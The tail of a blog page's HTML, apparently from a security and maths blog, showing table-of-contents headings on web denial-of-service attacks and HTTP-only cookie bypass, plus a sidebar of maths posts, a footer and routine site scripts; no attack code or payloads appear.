toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E4%BA%86%E5%93%AA%E4%BA%9B%E8%AF%B7%E6%B1%82"><span class="toc-number">5.15.</span> <span class="toc-text">查看服务器开了哪些请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E5%B1%82%E9%9D%A2%E4%B8%8A%E7%9A%84%E9%82%A3%E4%BA%9B%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-number">5.16.</span> <span class="toc-text">Web层面上的那些拒绝服务攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E7%94%9F%E6%88%90%E5%A4%A7%E5%B0%8F%E5%8F%AF%E6%8E%A7"><span class="toc-number">5.16.1.</span> <span class="toc-text">资源生成大小可控</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%9C%BA%E6%99%AF"><span class="toc-number">5.16.1.1.</span> <span class="toc-text">实际场景</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E7%82%B8%E5%BC%B9"><span class="toc-number">5.16.2.</span> <span class="toc-text">Zip炸弹</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%9C%BA%E6%99%AF"><span class="toc-number">5.16.2.1.</span> <span class="toc-text">实际场景</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xdos-xml%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-number">5.16.3.</span> <span class="toc-text">XDoS(XML拒绝服务攻击)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#billion-laughs"><span class="toc-number">5.16.3.1.</span> <span class="toc-text">Billion Laughs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#external-entity"><span class="toc-number">5.16.3.2.</span> <span class="toc-text">External Entity</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#internal-entity"><span class="toc-number">5.16.3.3.</span> <span class="toc-text">Internal Entity</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%9C%BA%E6%99%AF"><span class="toc-number">5.16.3.4.</span> <span class="toc-text">实际场景</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#redos-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-number">5.16.4.</span> <span class="toc-text">ReDoS(正则表达式拒绝服务攻击)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#nfa-%E5%9B%9E%E6%BA%AF"><span class="toc-number">5.16.4.1.</span> <span class="toc-text">NFA 回溯</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nfa-%E8%B4%AA%E5%A9%AA"><span class="toc-number">5.16.4.2.</span> <span class="toc-text">NFA 贪婪</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">5.16.4.3.</span> <span class="toc-text">恶意正则表达式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#redos-%E6%81%B6%E6%84%8F%E6%AD%A3%E5%88%99%E6%A3%80%E6%B5%8B"><span class="toc-number">5.16.4.4.</span> <span class="toc-text">ReDoS 恶意正则检测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%9C%BA%E6%99%AF"><span class="toc-number">5.16.4.5.</span> <span class="toc-text">实际场景</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2%E6%95%B0%E9%87%8F%E5%8F%AF%E6%8E%A7"><span class="toc-number">5.16.4.6.</span> <span class="toc-text">数据查询数量可控</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E4%BA%86http-only%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96cookie"><span class="toc-number">6.</span> <span class="toc-text">服务器开了HTTP-only如何获取cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFhttp-only"><span class="toc-number">6.0.1.</span> <span class="toc-text">什么是http-only</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E9%98%B2%E5%BE%A1%E5%91%A2%EF%BC%9F"><span class="toc-number">6.0.2.</span> <span class="toc-text">如何绕过防御呢？</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/26/FurtherMathematics_0x05/" title="泰勒展开"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/158.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="泰勒展开"/></a><div class="content"><a class="title" href="/2023/02/26/FurtherMathematics_0x05/" title="泰勒展开">泰勒展开</a><time datetime="2023-02-26T15:58:53.000Z" title="发表于 2023-02-26 23:58:53">2023-02-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/16/FurtherMathematics_0x04/" title="洛必达法则"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/157.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="洛必达法则"/></a><div class="content"><a class="title" href="/2023/02/16/FurtherMathematics_0x04/" title="洛必达法则">洛必达法则</a><time datetime="2023-02-16T15:58:53.000Z" title="发表于 2023-02-16 23:58:53">2023-02-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/14/FurtherMathematics_0x03/" title="微分中值定理"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/156.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="微分中值定理"/></a><div class="content"><a class="title" href="/2023/02/14/FurtherMathematics_0x03/" title="微分中值定理">微分中值定理</a><time datetime="2023-02-14T15:58:53.000Z" title="发表于 2023-02-14 23:58:53">2023-02-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/07/FurtherMathematics_0x02/" title="极限、导数、微分学"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/155.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="极限、导数、微分学"/></a><div class="content"><a class="title" href="/2023/02/07/FurtherMathematics_0x02/" title="极限、导数、微分学">极限、导数、微分学</a><time datetime="2023-02-07T15:58:53.000Z" title="发表于 2023-02-07 23:58:53">2023-02-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/07/FurtherMathematics_0x01/" title="函数与映射"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/154.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="函数与映射"/></a><div class="content"><a class="title" href="/2022/12/07/FurtherMathematics_0x01/" title="函数与映射">函数与映射</a><time datetime="2022-12-07T15:58:53.000Z" title="发表于 2022-12-07 23:58:53">2022-12-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://raw.githubusercontent.com/Ascotbe/Image/master/Blog/43.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By ascotbe</div><div class="footer_custom_text">Hi, welcome to my <a href="https://www.ascotbe.com/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container').forEach(node => {
            if (node.hasAttribute('display')) {
              btf.wrap(node, 'div', { class: 'mathjax-overflow' })
            } else {
              btf.wrap(node, 'span', { class: 'mathjax-overflow' })
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>function loadUtterances () {
  let ele = document.createElement('script')
  ele.setAttribute('id', 'utterances_comment')
  ele.setAttribute('src', 'https://utteranc.es/client.js')
  ele.setAttribute('repo', 'Ascotbe/Ascotbe.github.io')
  ele.setAttribute('issue-term', 'pathname')
  let nowTheme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'photon-dark' : 'github-light'
  ele.setAttribute('theme', nowTheme)
  ele.setAttribute('crossorigin', 'anonymous')
  ele.setAttribute('async', 'true')
  document.getElementById('utterances-wrap').insertAdjacentElement('afterbegin',ele)
}

function utterancesTheme () {
  const iframe = document.querySelector('.utterances-frame')
  if (iframe) {
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'photon-dark' : 'github-light'
    const message = {
      type: 'set-theme',
      theme: theme
    };
    iframe.contentWindow.postMessage(message, 'https://utteranc.es');
  }
}

if ('Utterances' === 'Utterances' || !true) {
  if (true) btf.loadComment(document.getElementById('utterances-wrap'), loadUtterances)
  else loadUtterances()
} else {
  function loadOtherComment () {
    loadUtterances()
  }
}</script></div><script src="/js/snowflake.js"></script><div class="aplayer no-destroy" data-id="2276118625" data-server="netease" data-type="playlist" data-fixed="true"  data-mini="playlist" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["link[rel=\"canonical\"]","meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"model":{"jsonPath":"/live2dw/assets/ots14_3001.model.json"},"display":{"position":"right","width":350,"height":400,"hOffset":-50,"vOffset":0},"mobile":{"show":false},"log":false});</script></body></html>